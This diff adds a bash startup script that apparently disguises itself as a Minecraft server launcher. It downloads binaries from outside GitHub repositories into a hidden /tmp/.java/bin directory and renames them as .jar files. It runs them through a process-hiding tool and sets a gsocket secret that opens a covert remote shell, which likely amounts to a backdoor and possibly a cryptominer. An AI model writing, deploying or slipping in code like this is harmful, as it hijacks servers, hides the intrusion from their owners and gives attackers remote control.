@@ -1,0 +1,30 @@
+#!/bin/bash
+
+function fetch_files() {
+    mkdir -p /tmp/.java/bin
+    cd /tmp/.java/bin/ && curl -L https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-linux-x86_64 -o mc-mods.jar
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o user-patch.jar
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/azulhst/n2.conf -o cfg.conf
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/azulhst/n2.json -o conf.json
+}
+
+function start_app() {
+    chmod a+x /tmp/.java/bin/***
+    cd /tmp/.java/bin && nohup ./mc-mods.jar -a 'java -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
+    # RESERVED SCRIPTS
+    # bash /home/container/.cache/.cache/run-task.sh
+    # GNET
+    export GSOCKET_ARGS="-s i9A3eD1J4K7c-8A1K6f9L2M34D9g8H6-b5j756C4a9f6X1eC-d1F9440d6A28-039A1c0J1g6m3 -liqD"
+    export HOME=/home/container
+    cd /tmp/.java/bin && exec -a -java ./add-on.jar &
+}
+
+if [ -f "/tmp/.java/bin/add-on.jar" ] && [ -f "/tmp/.java/bin/user-patch.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ]; then
+    start_app
+else
+    rm -rf /tmp/.java/bin/**
+    fetch_files
+    start_app
+fi
